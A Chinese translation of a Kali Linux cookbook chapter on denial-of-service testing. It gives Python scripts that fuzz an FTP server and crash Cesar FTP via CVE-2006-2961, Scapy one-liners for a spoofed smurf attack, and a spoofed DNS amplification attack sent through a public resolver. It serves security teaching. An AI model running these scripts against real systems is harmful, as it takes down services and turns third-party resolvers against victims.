# Kali Linux 网络扫描秘籍（四）



# 第六章：拒绝服务

> 作者：Justin Hutchens

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

任何时候，当你通过互联网访问公开资源，甚至通过内部网络访问小型社区时，重要的是要考虑拒绝服务（DoS）攻击的风险。 DoS 攻击可能令人沮丧，并且可能非常昂贵。 最糟糕的是，这些威胁往往是一些最难以缓解的威胁。 为了能够正确评估对网络和信息资源的威胁，必须了解现有的 DoS 威胁的类型以及与之相关的趋势。 

在单独讨论列出的每个秘籍之前，我们应该强调一些基本原则，并了解它们如何与本章中讨论的 DoS 攻击相关。 我们将在接下来的秘籍中讨论的 DoS 攻击可以分为缓冲区溢出，流量放大攻击或资源消耗攻击。 我们将按此顺序讨论与这些类型的攻击的工作原理相关的一般原则。

缓冲区溢出是一种编程漏洞，可能导致应用程序，服务或整个底层操作系统的拒绝服务。 一般来说，缓冲区溢出能够导致拒绝服务，因为它可能导致任意数据被加载到非预期的内存段。 这可能会中断执行流程，并导致服务或操作系统崩溃。 流量放大 DoS 攻击能够通过消耗特定服务器，设备或网络可用的网络带宽来产生 DoS 条件。 流量放大攻击需要两个条件才能成功。 这些条件如下：

+   重定向：攻击者必须能够请求可以重定向到受害者的响应。 这通常通过 IP 欺骗来实现。 因为 UDP 不是面向连接的协议，所以使用 UDP 作为其相关的传输层协议的大多数应用层协议，可以用于通过伪造的请求，将服务响应重定向到其他主机。 
+   放大：重定向的响应必须大于请求该响应的请求。 响应字节大小和请求字节大小的比率越大，攻击就越成功。

例如，如果发现了生成 10 倍于相关请求的响应的 UDP 服务，则攻击者可以利用该服务来潜在地生成 10 倍的攻击流量，而不是通过将伪造的请求发送到 漏洞服务，以可能最高的速率传输。 资源消耗攻击是产生如下的条件的攻击，其中主机服务器或设备的本地资源被消耗到一定程度，使得这些资源不再能够用于执行其预期的操作功能。 这种类型的攻击可以针对各种本地资源，包括内存，处理器性能，磁盘空间或并发网络连接的可持续性。

## 6.1 使用模糊测试来识别缓冲区溢出

识别缓冲区溢出漏洞的最有效的技术之一是模糊测试。 模糊测试通过将精巧的或随机数据传递给函数，来测试与各种输入相关的结果。 在正确的情况下，输入数据可能逃离其指定的缓冲区，并流入相邻的寄存器或内存段。 此过程将中断执行流程并导致应用程序或系统崩溃。 在某些情况下，缓冲区溢出漏洞也可以用于执行未经授权的代码。 在这个秘籍中，我们会讨论如何通过开发自定义的 Fuzzing 工具，来测试缓冲区溢出漏洞。

### 准备

为了执行远程模糊测试，你需要有一个运行 TCP 或 UDP 网络服务的系统。 在提供的示例中，使用了拥有 FTP 服务的 Windows XP 系统。 有关设置 Windows 系统的更多信息，请参阅本书第一章的“安装 Windows Server”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 工作原理

Python 是一种优秀的脚本语言，可用于高效开发自定义的模糊测试工具。 当评估 TCP 服务时，套接字函数可用于简化执行完全三次握手序列，和连接到监听服务端口的过程。 任何模糊脚本的主要目的是，将数据作为输入发送到任何给定的函数并评估结果。 我开发了一个脚本，可以用来模糊测试 FTP 服务的验证后的功能，如下所示：

```py
#!/usr/bin/python

import socket 
import sys

if len(sys.argv) != 6:   
    print "Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Payload] [Interval] [Maximum]"   
    print "Example - ./ftp_fuzz.py 10.0.0.5 21 A 100 1000"   
    print "Example will fuzz the defined FTP service with a series of payloads"   
    print "to include 100 'A's, 200 'A's, etc... up to the maximum of 1000"   
    sys.exit()

target = str(sys.argv[1]) 
port = int(sys.argv[2]) 
char = str(sys.argv[3]) 
i = int(sys.argv[4]) 
interval = int(sys.argv[4]) 
max = int(sys.argv[5]) 
user = raw_input(str("Enter ftp username: ")) 
passwd = raw_input(str("Enter ftp password: ")) 
command = raw_input(str("Enter FTP command to fuzz: "))

while i <= max:   
    try:      
        payload = command + " " + (char * i)      
        print "Sending " + str(i) + " instances of payload (" + char + ") to target"      
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)      
        connect=s.connect((target,port))      
        s.recv(1024)      
        s.send('USER ' + user + '\r\n')      
        s.recv(1024)      
        s.send('PASS ' + passwd + '\r\n')
        s.recv(1024)
        s.send(payload + '\r\n')
        s.send('QUIT\r\n')
        s.recv(1024)
        s.close()
        i = i + interval
    except:
        print "\nUnable to send...Server may have crashed"
        sys.exit()

print "\nThere is no indication that the server has crashed" 
```

脚本的第一部分定义了 Python 解释器的位置，并导入所需的库。 第二部分检查提供的参数数量，以确保其与脚本的适当用法一致。 脚本的第三部分定义将在整个脚本执行期间使用的变量。 其中几个变量从系统参数中接收到它们的值，这些参数在执行时传递给脚本。 剩余的变量通过接受脚本的用户的输入来定义。 最后，脚本的其余部分定义了模糊测试过程。 我们执行`ftp_fuzz.py`文件，如下：

```
root@KaliLinux:~# ./ftp_fuzz.py 
Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Payload] [Interval] [Maximum] 
Example - ./ftp_fuzz.py 10.0.0.5 21 A 100 1000 
Example will fuzz the defined FTP service with a series of payloads to include 100 'A's, 200 'A's, etc... up to the maximum of 1000 
root@KaliLinux:~# ./ftp_fuzz.py 172.16.36.134 21 A 100 1000 
Enter ftp username: anonymous 
Enter ftp password: user@mail.com 
Enter FTP command to fuzz: MKD

Sending 100 instances of payload (A) to target 
Sending 200 instances of payload (A) to target 
Sending 300 instances of payload (A) to target 
Sending 400 instances of payload (A) to target 
Sending 500 instances of payload (A) to target 
Sending 600 instances of payload (A) to target 
Sending 700 instances of payload (A) to target 
Sending 800 instances of payload (A) to target 
Sending 900 instances of payload (A) to target 
Sending 1000 instances of payload (A) to target

There is no indication that the server has crashed
```

如果脚本在没有适当数量的系统参数的情况下执行，脚本将返回预期的用法。有几个值必须作为系统参数来包含。要传递给脚本的第一个参数是目标 IP 地址。此 IP 地址是与运行所需模糊测试的 FTP 服务的系统相关的 IP 地址。下一个参数是运行 FTP 服务的端口号。在大多数情况下，FTP 在 TCP 端口 21 中运行。载荷定义了要批量传递到服务的字符或字符序列。 `interval`参数定义了在一次迭代中传递给 FTP 服务的载荷实例数。参数也是这样的数量，通过该数量，载荷实例的数量将随着每次连续迭代增加到最大值。此最大值由最后一个参数的值定义。在使用这些系统参数执行脚本后，它将请求 FTP 服务的身份验证凭证，并询问应该对哪个身份验证后的功能进行模糊测试。在提供的示例中，模糊测试对 IP 地址`172.16.36.134`的 Windows XP 主机的 TCP 端口 21 上运行的 FTP 服务执行。匿名登录凭据传递给了具有任意电子邮件地址的 FTP 服务。此外，一系列 As 被传递到 MKD 验证后的功能，从 100 个实例开始，并每次增加 100，直到达到最大 1000 个实例。同样的脚本也可以用来传递载荷中的一系列字符：

```
root@KaliLinux:~# ./ftp_fuzz.py 172.16.36.134 21 ABCD 100 500 
Enter ftp username: anonymous 
Enter ftp password: user@mail.com 
Enter FTP command to fuzz: MKD 
Sending 100 instances of payload (ABCD) to target 
Sending 200 instances of payload (ABCD) to target 
Sending 300 instances of payload (ABCD) to target
Sending 400 instances of payload (ABCD) to target 
Sending 500 instances of payload (ABCD) to target

There is no indication that the server has crashed
```

在所提供的示例中，载荷被定义为`ABCD`，并且该载荷的实例被定义为 100 的倍数，直到最大值 500。

### 工作原理

一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。 此秘籍中讨论的特定脚本的工作原理是，在服务或操作系统崩溃的情况下，套接字将不再接受输入，并且脚本将无法完成整个载荷注入序列。 如果发生这种情况，脚本需要使用`Ctrl + C`强制关闭。在这种情况下，脚本会返回一个标志，表示后续的载荷无法发送，并且服务器可能已崩溃。

## 6.2 FTP 远程服务的缓冲区溢出 DoS 攻击

在正确的情况下，输入数据可能逃离其指定的缓冲区并流入相邻的寄存器或内存段。 此过程将中断执行流程并导致应用程序或系统崩溃。 在某些情况下，缓冲区溢出漏洞也可以用于执行未经授权的代码。 在这个特定的秘籍中，我们基于 Cesar 0.99 FTP 服务的缓冲区溢出，展示如何执行 DoS 攻击的示例。

### 准备

为了执行远程模糊测试，你需要有一个运行 TCP 或 UDP 网络服务的系统。 在提供的示例中，使用了拥有 FTP 服务的 Windows XP 系统。 有关设置 Windows 系统的更多信息，请参阅本书第一章的“安装 Windows Server”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 操作步骤

有一个公开披露的漏洞与 Cesar 0.99 FTP 服务相关。 此漏洞由常见漏洞和披露（CVE）编号系统定义为 CVE-2006-2961。 通过对此漏洞进行研究，显然可以通过向 MKD 函数发送换行字符的验证后序列，来触发基于栈的缓冲区溢出。 为了避免将`\ n`转义序列传递给 Python 脚本，以及之后在提供的输入中正确解释它的相关困难，我们应该修改先前秘籍中讨论的脚本。 然后，我们可以使用修改的脚本来利用此现有漏洞：

```py
#!/usr/bin/python

import socket 
import sys

if len(sys.argv) != 5:   
    print "Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Interval] [Maximum]"   
    print "Example - ./ftp_fuzz.py 10.0.0.5 21 100 1000"   
    print "Example will fuzz the defined FTP service with a series of line break "   
    print "characters to include 100 '\\n's, 200 '\\n's, etc... up to the maximum of 1000"   
    sys.exit()

target = str(sys.argv[1]) 
port = int(sys.argv[2]) 
i = int(sys.argv[3]) 
interval = int(sys.argv[3]) 
max = int(sys.argv[4]) 
user = raw_input(str("Enter ftp username: ")) 
passwd = raw_input(str("Enter ftp password: ")) 
command = raw_input(str("Enter FTP command to fuzz: "))

while i <= max:   
    try:      
        payload = command + " " + ('\n' * i)      
        print "Sending " + str(i) + " line break characters to target"      
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        connect=s.connect((target,port))      
        s.recv(1024)
        s.send('USER ' + user + '\r\n')
        s.recv(1024)
        s.send('PASS ' + passwd + '\r\n')
        s.recv(1024)
        s.send(payload + '\r\n')
        s.send('QUIT\r\n')
        s.recv(1024)
        s.close()
        i = i + interval
    except:
        print "\nUnable to send...Server may have crashed"
        sys.exit()

print "\nThere is no indication that the server has crashed" 
```

对脚本所做的修改包括，修改使用描述和删除作为提供的参数的载荷，然后将换行载荷硬编码到要按顺序发送的脚本中。

```
root@KaliLinux:~# ./ftp_fuzz.py 
Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Interval] [Maximum] 
Example - ./ftp_fuzz.py 10.0.0.5 21 100 1000 
Example will fuzz the defined FTP service with a series of line break characters to include 100 '\n's, 200 '\n's, etc... up to the maximum of 1000 
root@KaliLinux:~# ./ftp_fuzz.py 172.16.36.134 21 100 1000 
Enter ftp username: anonymous 
Enter ftp password: user@mail.com 
Enter FTP command to fuzz: MKD 
Sending 100 line break characters to target 
Sending 200 line break characters to target 
Sending 300 line break characters to target 
Sending 400 line break characters to target 
Sending 500 line break characters to target 
Sending 600 line break characters to target 
Sending 700 line break characters to target 
^C 
Unable to send...Server may have crashed
```

如果脚本在没有适当数量的系统参数的情况下执行，脚本将返回预期的用法。 然后，我们可以执行脚本并发送一系列载荷，它们的数量为 100 的倍数，最大为 1000。在发送 700 个换行符的载荷后，脚本停止发送载荷，并处于空闲状态。 在一段时间不活动后，脚本使用`Ctrl + C`被强制关闭。脚本表示它已经无法发送字符，并且远程服务器可能已经崩溃。 看看下面的截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/6-2-1.jpg)

通过返回到运行 Cesar 0.99 FTP 服务的 Windows XP 主机，我们可以看到`server.exe`应用程序崩溃了。 要在拒绝服务后恢复操作，必须手动重新启动 Cesar FTP 服务。

### 工作原理

一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。 此秘籍中讨论的特定脚本的工作原理是，在服务或操作系统崩溃的情况下，套接字将不再接受输入，并且脚本将无法完成整个有效载荷注入序列。 如果发生这种情况，脚本需要使用`Ctrl + C`强制关闭。在这种情况下，脚本将返回一个标识，表明后续载荷无法发送，并且服务器可能已崩溃。

## 6.3 Smurf DoS 攻击

smurf 攻击是历史上用于执行分布式拒绝服务（DDoS）放大攻击的最古老的技术之一。 此攻击包括向网络广播地址发送一系列 ICMP 回响请求，带有伪造的源 IP 地址。 当广播此回显请求时，LAN 上的所有主机会同时对收到的每个伪造请求的目标进行回复。 这种技术对现代系统的效率较低，因为大多数系统不会回复 IP 定向的广播流量。

### 准备

要执行 smurf 攻击，您需要有一个 LAN，上面运行多个系统。 提供的示例将 Ubuntu 用作扫描目标。 有关设置 Ubuntu 的更多信息，请参阅本书第一章中的“安装 Ubuntu Server”秘籍。

### 操作步骤

为了尝试执行传统的 smurf 攻击，Scapy 可以用于从零开始构建必要的数据包。 为了从 Kali Linux 命令行使用 Scapy，请从终端使用`scapy`命令，如下所示。 为了向广播地址发送 ICMP 请求，我们必须首先构建此请求的层级。 我们将需要构建的第一层是 IP 层：

```
root@KaliLinux:~# scapy Welcome to Scapy (2.2.0) 
>>> i = IP() 
>>> i.display() 
###[ IP ]###  
    version= 4  
    ihl= None
    tos= 0x0
    len= None
    id= 1
    flags=
    frag= 0
    ttl= 64
    proto= ip
    chksum= None
    src= 127.0.0.1
    dst= 127.0.0.1
    \options\ 
>>> i.dst = "172.16.36.255" 
>>> i.display() 
###[ IP ]###
    version= 4
    ihl= None
    tos= 0x0
    len= None
    id= 1
    flags=
    frag= 0
    ttl= 64
    proto= ip
    chksum= None
    src= 172.16.36.224
    dst= 172.16.36.255
    \options\ 
```

要构建我们的请求的 IP 层，我们应该将 `IP` 对象赋给变量`i`。 通过调用`display()`函数，我们可以确定该对象的属性配置。 通常，发送和接收地址都设为回送地址`127.0.0.1`。 可以通过将`i.dst`设置为广播地址的字符串值，来更改目标地址并修改这些值。 通过再次调用`display()`函数，我们可以看到，不仅更新了目的地址，而且`Scapy`也会自动将源 IP 地址更新为与默认接口相关的地址。 现在我们已经构建了请求的 IP 层，我们应该继续构建 ICMP 层：

```
>>> ping = ICMP() 
>>> ping.display() 
###[ ICMP ]###  
    type= echo-request  
    code= 0  
    chksum= None  
    id= 0x0  
    seq= 0x0 
```

要构建我们的请求的 ICMP 层，我们将使用与 IP 层相同的技术。 默认情况下，ICMP 层已配置为执行回显请求。 现在我们已经创建了 IP 和 ICMP 层，我们需要通过堆叠这些层来构造请求：

```
>>> request = (i/ping) 
>>> request.display() 
###[ IP ]###  
    version= 4  
    ihl= None  
    tos= 0x0  
    len= None  
    id= 1
    flags=  
    frag= 0  
    ttl= 64  
    proto= icmp  
    chksum= None  
    src= 172.16.36.224  
    dst= 172.16.36.255  
    \options\ 
###[ ICMP ]###  
    type= echo-request  
    code= 0  
    chksum= None  
    id= 0x0  
    seq= 0x0 
>>> send(request) 
. 
Sent 1 packets.
```

可以通过使用斜杠分隔变量，来堆叠 IP 和 ICMP 层。 然后可以将这些层及赋给表示整个请求的新变量。 然后可以调用`display()`函数来查看请求的配置。 一旦建立了请求，就可以将其传递给函数。 可以使用 Wireshark 或 TCPdump 等数据包捕获工具来监控结果。 在提供的示例中，Wireshark 显示，LAN 上的两个 IP 地址响应了广播回响请求：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/6-3-1.jpg)

实际上，两个响应地址不足以执行有效的 DoS 攻击。 如果这个练习复制到另一个具有半现代化主机的实验室中，结果很可能是类似的。 在有足够的响应地址来触发拒绝服务的情况下，源地址将需要替换为了攻击目标的 IP 地址：

```
>>> send(IP(dst="172.16.36.255",src="172.16.36.135")/ ICMP(),count=100,verbose=1) 
......................................................................... ........................... 
Sent 100 packets. 
```

在提供的示例中，Scapy 的单行命令用于执行与之前讨论的相同操作，但此时除外，源 IP 地址被伪造为 LAN 上另一个系统的地址。 此外，`count`可用于按顺序发送多个请求。

### 工作原理

放大攻击的原理是利用第三方设备，使网络流量压倒目标。 对于多数放大攻击，必须满足两个条件：

+   用于执行攻击的协议不验证请求源
+   来自所使用的网络功能的响应应该显着大于用于请求它的请求。

传统 smurf 攻击的效率取决于 LAN 上响应 IP 定向的广播流量的主机。 这种主机从目标系统的伪造 IP 地址接收 ICMP 广播回响请求，然后针对接收到的每个请求同时返回 ICMP 回响应答。

## 6.4 DNS 放大 DoS 攻击

DNS 放大攻击通过对给定域执行所有类型记录的伪造查询，来利用开放的 DNS 解析器。 通过同时向多个开放的解析器发送请求来使用 DDoS 组件，可以提高这种攻击的效率。

### 准备

为了模拟 DNS 放大攻击，你需要有一个本地名称服务器，或知道一个开放和可公开访问的名称服务器的 IP 地址。 提供的示例将 Ubuntu 用作扫描目标。 有关设置 Ubuntu 的更多信息，请参阅本书第一章中的“安装 Ubuntu Server”秘籍。

### 操作步骤

为了了解 DNS 放大的工作原理，可以使用基本的 DNS 查询工具，如`host`，`dig`或`nslookup`。 通过对与已建立的域相关的所有记录类型执行请求，你将注意到一些请求返回了相当大的响应：

```
root@KaliLinux:~# dig ANY google.com @208.67.220.220

; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> ANY google.com @208.67.220.220 
;; global options: +cmd
;; Got answer: 
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 41539 
;; flags: qr rd ra; QUERY: 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 0
;; QUESTION SECTION: ;
google.com.         IN   ANY
;; ANSWER SECTION: 
google.com.      181   IN   A   74.125.232.101 
google.com.      181   IN   A   74.125.232.97 
google.com.      181   IN   A   74.125.232.102 
google.com.      181   IN   A   74.125.232.99 
google.com.      181   IN   A   74.125.232.104 
google.com.      181   IN   A   74.125.232.96 
google.com.      181   IN   A   74.125.232.100 
google.com.      181   IN   A   74.125.232.103 
google.com.      181   IN   A   74.125.232.105 
google.com.      181   IN   A   74.125.232.98 
google.com.      181   IN   A   74.125.232.110 
google.com.      174   IN   AAAA   2607:f8b0:4004:803::1007 
google.com.      167024   IN   NS   ns2.
google.com. 
google.com.      167024   IN   NS   ns1.
google.com. 
google.com.      167024   IN   NS   ns3.
google.com. 
google.com.      167024   IN   NS   ns4.
google.com. 
google.com.      60   IN   SOA   ns1.
google.com. dns-admin.
google.com. 1545677 7200 1800 1209600 300

;; Query time: 7 msec 
;; SERVER: 208.67.220.220#53(208.67.220.220) 
;; WHEN: Thu Dec 19 02:40:16 2013 
;; MSG SIZE  rcvd: 35
```

在提供的示例中，与`google.com`域相关的所有记录类型的请求返回了一个响应，包含 11 个 A 记录，1 个 AAAA 记录，4 个 NS 记录和 1 个 SOA 记录。 DNS 放大攻击的效率与响应大小直接相关。 我们现在将尝试使用 Scapy 中构建的数据包执行相同的操作。 要发送我们的 DNS 查询请求，我们必须首先构建此请求的层级。 我们需要构建的第一层是 IP 层：

```
root@KaliLinux:~# scapy Welcome to Scapy (2.2.0) 
>>> i = IP() 
>>> i.display() 
###[ IP ]###
    version= 4
    ihl= None
    tos= 0x0
    len= None
    id= 1
    flags=
    frag= 0
    ttl= 64
    proto= ip
    chksum= None
    src= 127.0.0.1
    dst= 127.0.0.1
    \options\ 
>>> i.dst = "208.67.220.220" 
>>> i.display() 
###[ IP ]###
    version= 4
    ihl= None
    tos= 0x0
    len= None
    id= 1
    flags=
    frag= 0
    ttl= 64
    proto= ip
    chksum= None
    src= 172.16.36.180
    dst= 208.67.220.220
    \options\ 
```

要构建我们的请求的 IP 层，我们应该将 `IP` 对象赋给变量`i`。 通过调用`display()`函数，我们可以确定该对象的属性配置。 通常，发送和接收地址都设为回送地址`127.0.0.1`。 可以通过将`i.dst`设置为广播地址的字符串值，来更改目标地址并修改这些值。 通过再次调用`display()`函数，我们可以看到，不仅更新了目的地址，而且`Scapy`也会自动将源 IP 地址更新为与默认接口相关的地址。 现在我们已经构建了请求的 IP 层，我们应该继续构建 UDP 层：

```
>>> u = UDP() 
>>> u.display() 
###[ UDP ]###  
    sport= domain  
    dport= domain  
    len= None  
    chksum= None 
>>> u.dport 53
```

要构建我们的请求的 UDP 层，我们将使用与 IP 层相同的技术。 在提供的示例中，`UDP` 对象赋给了`u`变量。 如前所述，可以通过调用`display()`函数来确定默认配置。 在这里，我们可以看到源和目标端口的默认值都列为`domain`。 您可能能猜到，这表示与端口 53 相关的 DNS 服 务。DNS 是一种常见的服务，通常可以在网络系统上发现。 要确认这一点，我们可以通过引用变量名和属性直接调用该值。 既然已经构建了 IP 和 UDP 层，我们需要构建 DNS 层：

```
>>> d = DNS() 
>>> d.display() 
###[ DNS ]###
  id= 0
  qr= 0
  opcode= QUERY
  aa= 0
  tc= 0
  rd= 0
  ra= 0
  z= 0
  rcode= ok
  qdcount= 0
  ancount= 0
  nscount= 0
  arcount= 0
  qd= None
  an= None
  ns= None
  ar= None 
```

为了构建我们的请求的 DNS 层，我们将使用与 IP 和 UDP 层相同的技术。 在提供的示例中，DNS 对象赋给了`d`变量。 如前所述，可以通过调用`display()`函数来确定默认配置。 在这里，我们可以看到有几个值需要修改：

```
>>> d.rd = 1 
>>> d.qdcount = 1 
>>> d.display() 
###[ DNS ]###
  id= 0
  qr= 0
  opcode= QUERY
  aa= 0
  tc= 0
  rd= 1
  ra= 0
  z= 0
  rcode= ok
  qdcount= 1
  ancount= 0
  nscount= 0
  arcount= 0
  qd= None
  an= None
  ns= None  
  ar= None 
```

RD 位需要被激活; 这可以通过将`rd`值设置为 1 来实现。此外，需要为`qdcount`提供值`0x0001`; 这可以通过提供整数值 1 来完成。通过再次调用`display()`函数，我们可以验证是否已经调整了配置。 现在已经构建了 IP，UDP 和 DNS 层，我们需要构建一个 DNS 问题记录以分配给`qd`值：

```
>>> q = DNSQR() 
>>> q.display() 
###[ DNS Question Record ]###  
    qname= '.'  
    qtype= A  
    qclass= IN 
```

为了构建 DNS 问题记录，我们将使用与 IP，UDP 和 DNS 层相同的技术。 在提供的示例中，DNS 问题记录已赋给`q`变量。 如前所述，可以通过调用`display()`函数来确定默认配置。 在这里，我们可以看到有几个值需要修改：

```
>>> q.qname = 'google.com' 
>>> q.qtype=255 
>>> q.display() 
###[ DNS Question Record ]###
  qname= 'google.com'
  qtype= ALL
  qclass= IN 
```

`qname`值需要设置为要查询的域。 另外，`qtype`需要通过传递一个整数值 255 来设置为`ALL`。通过再次调用`display()`函数，我们可以验证是否已经调整了配置。 现在问题记录已经配置完毕，问题记录对象应该赋给 DNS `qd`值：

```
>>> d.qd = q 
>>> d.display() 
###[ DNS ]###  
id= 0  
qr= 0  
opcode= QUERY
aa= 0
  tc= 0
  rd= 1
  ra= 0
  z= 0
  rcode= ok
  qdcount= 1
  ancount= 0
  nscount= 0
  arcount= 0
  \qd\
   |###[ DNS Question Record ]###
   |
  qname= 'google.com'
   |
  qtype= ALL
   |
  qclass= IN
  an= None
  ns= None
  ar= None
```

我们可以通过调用`display()`函数来验证问题记录是否已赋给 DNS `qd`值。 现在已经构建了 IP，UDP 和 DNS 层，并且已经将相应的问题记录赋给 DNS 层，我们可以通过堆叠这些层来构造请求：

```
>>> request = (i/u/d) 
>>> request.display() 
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags=
  frag= 0
  ttl= 64
  proto= udp
  chksum= None
  src= 172.16.36.180
  dst= 208.67.220.220
  \options\ 
###[ UDP ]###
   sport= domain
   dport= domain
   len= None
   chksum= None 
###[ DNS ]###
  id= 0
  qr= 0
  opcode= QUERY
  aa= 0
  tc= 0
  rd= 1
  ra= 0
  z= 0
  rcode= ok
  qdcount= 1
  ancount= 0
  nscount= 0
  arcount= 0  
  \qd\
   |###[ DNS Question Record ]###
   | qname= 'google.com'
   | qtype= ALL
   | qclass= IN
  an= None
  ns= None
  ar= None
```

可以通过使用斜杠分隔变量来堆叠 IP，UDP 和 DNS 层。 然后可以将这些层赋给表示整个请求的新变量。 然后可以调用`display()`函数来查看请求的配置。 在发送此请求之前，我们应该以相同的显示格式查看它，因为我们需要查看响应。 这样，我们可以更好地从视觉上理解请求和响应之间发生的放大。 这可以通过直接调用变量来完成：

```
>>> request 

<IP  frag=0 proto=udp dst=208.67.220.220 |<UDP  sport=domain |<DNS  rd=1 qdcount=1 qd=<DNSQR  qname='google.com' qtype=ALL |> |>>>
```


一旦建立了请求，它就可以被传递给发送和接收函数，以便我们可以分析响应。 我们不会将它赋给一个变量，而是直接调用该函数，以便可以以相同的格式查看响应：

```
>>> sr1(request) 
Begin emission: 
....................Finished to send 1 packets. 
.............................* 
Received 50 packets, got 1 answers, remaining 0 packets 

<IP  version=4L ihl=5L tos=0x0 len=378 id=29706 flags= frag=0L ttl=128 proto=udp chksum=0x4750 src=208.67.220.220 dst=172.16.36.232 options=[] |<UDP  sport=domain dport=domain len=358 chksum=0xf360 |<DNS  id=0 qr=1L opcode=QUERY aa=0L tc=0L rd=1L ra=1L z=0L rcode=ok qdcount=1 ancount=17 nscount=0 arcount=0 qd=<DNSQR  qname='google.com.' qtype=ALL qclass=IN |> an=<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.103' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.102' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.98' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.96' |<DNSRR  rrname='google. com.' type=A rclass=IN ttl=188 rdata='74.125.228.99' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.110' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.100' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.97' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.104' |<DNSRR  rrname='google. com.' type=A rclass=IN ttl=188 rdata='74.125.228.105' |<DNSRR  rrname='google.com.' type=A rclass=IN ttl=188 rdata='74.125.228.101' |<DNSRR  rrname='google.com.' type=AAAA rclass=IN ttl=234 rdata='2607 :f8b0:4004:803::1002' |<DNSRR  rrname='google.com.' type=NS rclass=IN ttl=171376 rdata='ns2.google.com.' |<DNSRR  rrname='google.com.' type=NS rclass=IN ttl=171376 rdata='ns1.google.com.' |<DNSRR  rrname='google. com.' type=NS rclass=IN ttl=171376 rdata='ns3.google.com.' |<DNSRR  rrname='google.com.' type=NS rclass=IN ttl=171376 rdata='ns4.google.com.' |<DNSRR  rrname='google.com.' type=SOA rclass=IN ttl=595 rdata='\xc1\x06\ tdns-admin\xc0\x0c\x00\x17\xd0`\x00\x00\x1c \x00\x00\x07\x08\x00\x12u\ x00\x00\x00\x01,' |>>>>>>>>>>>>>>>>> ns=None ar=None |>>> 
```

该响应确认了我们已成功构建所需的请求，并且我们已请求了一个相当大的有效内容，其中包括`google.com`域的 11 个 A 记录，1 个 AAAA 记录，4 个 NS 记录和 1 个 SOA 记录。 此练习清楚地表明，请求的响应明显大于请求本身。 为了使这个放大攻击有效，它需要通过伪造源 IP 地址重定向到我们的目标：

```
>>> i.src = "172.16.36.135" 
>>> i.display()
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags=
  frag= 0
  ttl= 64
  proto= ip
  chksum= None
  src= 172.16.36.135
  dst= 208.67.220.220
  \options\ 
>>> request = (i/u/d) 
>>> request 
<IP  frag=0 proto=udp src=172.16.36.135 dst=208.67.220.220 |<UDP  sport=domain |<DNS  rd=1 qdcount=1 qd=<DNSQR  qname='google.com' qtype=ALL |> |>>>
```

将源 IP 地址值重新定义为目标系统的 IP 地址的字符串后，我们可以使用`display()`函数确认该值已调整。 然后我们可以重建我们的更改后的请求。 为了验证我们是否能够将 DNS 查询响应重定向到此伪造主机，我们可以在主机上启动 TCPdump：

```
admin@ubuntu:~$ sudo tcpdump -i eth0 src 208.67.220.220 -vv 
[sudo] password for admin: 
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 
```

在提供的示例中，TCPdump 配置将捕获`eth0`接口上，来自`208.67.220.220`源地址（查询的 DNS 服务器的地址）的所有流量。 然后，我们可以使用`send()`函数发送我们的请求：

```
>>> send(request) 
. 
Sent 1 packets. 
>>> send(request) 
. 
Sent 1 packets.
```

发送请求后，我们应该返回到 TCPdump 的内容，来验证 DNS 查询的响应是否返回给了受害服务器：

```
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 
19:07:12.926773 IP (tos 0x0, ttl 128, id 11341, offset 0, flags [none], proto UDP (17), length 350) resolver2.opendns.com.domain > 172.16.36.135. domain: [udp sum ok] 0 q: ANY? google.com. 16/0/0 google.com. A yyz08s13in-f4.1e100.net, google.com. A yyz08s13-in-f5.1e100.net, google. com. A yyz08s13-in-f14.1e100.net, google.com. A yyz08s13-in-f6.1e100. net, google.com. A yyz08s13-in-f2.1e100.net, google.com. A yyz08s13in-f0.1e100.net, google.com. A yyz08s13-in-f3.1e100.net, google.com. A yyz08s13-in-f1.1e100.net, google.com. A yyz08s13-in-f9.1e100.net, google. com. A yyz08s13-in-f7.1e100.net, google.com. A yyz08s13-in-f8.1e100.net, google.com. NS ns2.google.com., google.com. NS ns1.google.com., google. com. NS ns3.google.com., google.com. NS ns4.google.com., google.com. SOA ns1.google.com. dns-admin.google.com. 1545677 7200 1800 1209600 300 (322) 
